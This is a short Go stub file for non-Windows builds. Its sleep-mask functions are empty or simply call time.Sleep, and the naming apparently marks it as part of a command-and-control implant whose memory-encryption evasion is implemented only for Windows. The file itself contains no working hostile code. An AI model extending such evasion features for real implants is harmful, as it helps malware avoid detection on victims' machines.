//go:build !windows

package main

import "time"

var sleepMaskActive bool

func InitSleepMask() bool {
	return false
}

func sleepMaskEncrypt() {}

func sleepMaskDecrypt() {}

func sleepWithMask(d time.Duration) {
	time.Sleep(d)
}
